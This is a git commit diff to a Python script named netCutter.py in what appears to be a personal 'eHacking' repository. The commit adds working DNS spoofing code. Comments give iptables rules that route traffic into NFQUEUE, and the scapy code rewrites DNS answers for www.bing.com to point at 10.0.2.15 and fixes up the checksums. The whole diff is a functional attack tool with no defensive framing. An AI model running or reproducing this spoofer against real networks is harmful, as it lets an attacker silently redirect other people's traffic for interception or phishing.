93eccce5421120c50bea6812df8cbc548b50c84d
ramkrushna26 <ramkrushna.bolewar1@gmail.com>
2020-07-05 12:19:56 +0530

    edited netc

--- eHacking/netCutter.py
+++ eHacking/netCutter.py
@@ -1,10 +1,32 @@
 
+# Before running this script, you need to bind traffic to queue 0 in iptables
+# $ iptables -I INPUT -j NFQUEUE --queue-num 0
+# $ iptables -I OUTPUT -j NFQUEUE --queue-num 0
+
+# For spoofing remote machines you need forward traffic
+# $ iptables -I FORWARD -j NFQUEUE --queue-num 0
+
+
 import netfilterqueue
 import scapy.all as scapy
 
 def processPacket(packet):
 	scapyPacket = scapy.IP(packet.get_payload())
-	print(scapyPacket.show())
+	if scapyPacket.haslayer(scapy.DNSRR):
+		qname = scapyPacket[scapy.DNSQR].qname
+		if "www.bing.com" in str(qname):
+			print("[+] Spoofing Target")
+			answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")
+			scapyPacket[scapy.DNS].an = answer
+			scapyPacket[scapy.DNS].ancount = 1
+
+			del scapyPacket[scapy.IP].len
+			del scapyPacket[scapy.IP].chksum
+			del scapyPacket[scapy.UDP].len
+			del scapyPacket[scapy.UDP].chksum
+
+			packet.set_payload(str(scapyPacket))
+
 	packet.accept()
 
 
